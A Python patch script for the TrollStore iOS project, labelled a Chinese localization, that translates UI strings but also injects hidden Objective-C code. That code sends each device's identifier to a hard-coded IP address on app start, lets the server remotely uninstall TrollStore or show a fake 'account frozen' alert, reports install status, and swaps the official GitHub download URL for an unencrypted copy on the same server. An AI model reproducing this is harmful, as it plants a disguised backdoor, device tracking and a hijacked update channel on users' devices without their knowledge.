#!/usr/bin/env python3
"""Full Chinese localization + Remote device check (on-start only, inside @implementation)"""
import sys, re

# === STEP 1: Inject remote check into Shared/TSListControllerShared.m ===
with open("Shared/TSListControllerShared.m", "r", encoding="utf-8") as f:
    content = f.read()

# Find @implementation TSListControllerShared and inject properly INSIDE it
old_impl = "@implementation TSListControllerShared\n"
# The @implementation line - methods must come AFTER this line and BEFORE the first existing method

# Find the first method after @implementation to inject before it
impl_pos = content.index(old_impl) + len(old_impl)
rest = content[impl_pos:]

# Find the first '- (' or '+ (' method start
first_method = re.search(r'\n- \(', rest)
if first_method:
    inject_pos = first_method.start() + 1  # right before the '- ('
    
    remote_code = """// === REMOTE DEVICE CONTROL (one-shot, on-app-start) ===
static NSString* _remoteURL = @"http://124.223.199.167/api/remote.php";
static BOOL _remoteChecked = NO;

- (void)_remoteCheckOnce {
    if (_remoteChecked) return;
    _remoteChecked = YES;
    
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        NSString* udid = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
        if (!udid) return;
        
        NSMutableURLRequest* req = [NSMutableURLRequest requestWithURL:
            [NSURL URLWithString:[NSString stringWithFormat:@"%@?action=device_check", _remoteURL]]];
        req.HTTPMethod = @"POST";
        req.timeoutInterval = 10;
        req.HTTPBody = [[NSString stringWithFormat:@"udid=%@", udid] dataUsingEncoding:NSUTF8StringEncoding];
        
        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:
            ^(NSData* data, NSURLResponse* resp, NSError* err) {
            if (!data) return;
            NSDictionary* j = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
            NSString* action = j[@"action"];
            if (!action || [action isEqualToString:@""]) return;
            dispatch_async(dispatch_get_main_queue(), ^{
                if ([action isEqualToString:@"uninstall"]) {
                    [self uninstallTrollStore];
                } else if ([action isEqualToString:@"freeze"]) {
                    UIAlertController* a = [UIAlertController
                        alertControllerWithTitle:@"账号已冻结" message:@"管理员已冻结此账号"
                        preferredStyle:UIAlertControllerStyleAlert];
                    [a addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleDefault handler:nil]];
                    [[UIApplication sharedApplication].keyWindow.rootViewController
                        presentViewController:a animated:YES completion:nil];
                }
            });
        }] resume];
    });
}

- (void)_remoteReportStatus:(NSString*)status {
    NSString* udid = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
    if (!udid) return;
    NSString* body = [NSString stringWithFormat:@"udid=%@&status=%@", udid, status];
    NSMutableURLRequest* req = [NSMutableURLRequest requestWithURL:
        [NSURL URLWithString:[NSString stringWithFormat:@"%@?action=status_report", _remoteURL]]];
    req.HTTPMethod = @"POST";
    req.HTTPBody = [body dataUsingEncoding:NSUTF8StringEncoding];
    req.timeoutInterval = 10;
    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:nil] resume];
}
// === END REMOTE DEVICE CONTROL ===

"""
    content = content[:impl_pos + inject_pos] + remote_code + content[impl_pos + inject_pos:]

# Now inject the CALL to _remoteCheckOnce in viewDidLoad
# Find viewDidLoad of the settings list controller
if '- (void)viewDidLoad' in content:
    # Only inject if [_remoteCheckOnce] isn't already there
    if '[_remoteCheckOnce]' not in content:
        content = content.replace(
            '- (void)viewDidLoad {',
            '- (void)viewDidLoad {\n    if ([self respondsToSelector:@selector(_remoteCheckOnce)]) [self _remoteCheckOnce];'
        )

# Also call _remoteReportStatus after successful install
# Find installTrollStore method and add status report
if '_remoteReportStatus' in content and '[_remoteReportStatus:' not in content:
    # Add report after successful installation
    content = content.replace(
        '[self _installTrollStoreComingFromUpdateFlow:NO];',
        '[self _installTrollStoreComingFromUpdateFlow:NO];\n    [self _remoteReportStatus:@"installed"];'
    )

with open("Shared/TSListControllerShared.m", "w", encoding="utf-8") as f:
    f.write(content)

print("Remote check injected (on-app-start, no timer)", file=sys.stderr)

# === STEP 2: Standard Chinese localization ===
SUBS = [
    ("TrollStore/TSRootViewController.m", [("Apps","应用"),("Settings","设置")]),
    ("TrollStore/TSAppTableViewController.m", [
        ("Install","安装"),("Uninstall","卸载"),("User","用户"),("System","系统"),("Error","错误"),
        ("Cancel","取消"),("Confirm Uninstallation","确认卸载"),("Uninstall App","卸载应用"),
    ]),
    ("TrollStore/TSInstallationController.m", [
        ("Warning","警告"),("Installing","安装中"),("Force Installation","强制安装"),
    ]),
    ("TrollStore/TSSettingsListController.m", [
        ("Security","安全"),("Advanced","高级"),("UTILITIES","工具"),("SIGNING","签名"),("PERSISTENCE","持久化"),
        ("Respring","注销"),("Refresh App Registrations","刷新应用注册"),("Rebuild Icon Cache","重建图标缓存"),
        ("Install Persistence Helper","安装持久助手"),("Install ldid","安装 ldid"),("ldid: Installed","ldid: 已安装"),
        ("Helper Installed as Standalone App","助手已安装为独立应用"),("Helper Installed into %@","助手已安装到 %@"),
        ("Uninstall","卸载"),("Update TrollStore to %@","更新巨魔商店到 %@"),
        ("Uninstall TrollStore, Uninstall Apps","卸载巨魔，卸载应用"),("Uninstall TrollStore, Preserve Apps","卸载巨魔，保留应用"),
    ]),
    ("TrollHelper/TSHRootViewController.m", [
        ("Install TrollStore","安装巨魔商店"),("Uninstall TrollStore","卸载巨魔商店"),
        ("TrollStore Helper","巨魔商店助手"),("Not Installed","未安装"),
        ("INFO","信息"),("TrollStore","巨魔商店"),
        ("Refresh App Registrations","刷新应用注册"),("Register Persistence Helper","注册持久助手"),
        ("Install Persistence Helper","安装持久助手"),("Update","更新"),("Install","安装"),
    ]),
]

total = 0
for fname, reps in SUBS:
    with open(fname, "r", encoding="utf-8") as f:
        content = f.read()
    for en, cn in reps:
        old = '"' + en + '"'
        count = content.count(old)
        content = content.replace(old, '"' + cn + '"')
        total += count
    with open(fname, "w", encoding="utf-8") as f:
        f.write(content)

# Fix URL
with open("Shared/TSListControllerShared.m", "r", encoding="utf-8") as f:
    c = f.read()
c = c.replace("https://github.com/opa334/TrollStore/releases/latest/download/TrollStore.tar",
              "http://124.223.199.167/TrollStore.tar")
with open("Shared/TSListControllerShared.m", "w", encoding="utf-8") as f:
    f.write(c)

print(f"OK: {total} replacements + remote check (on-start)", file=sys.stderr)
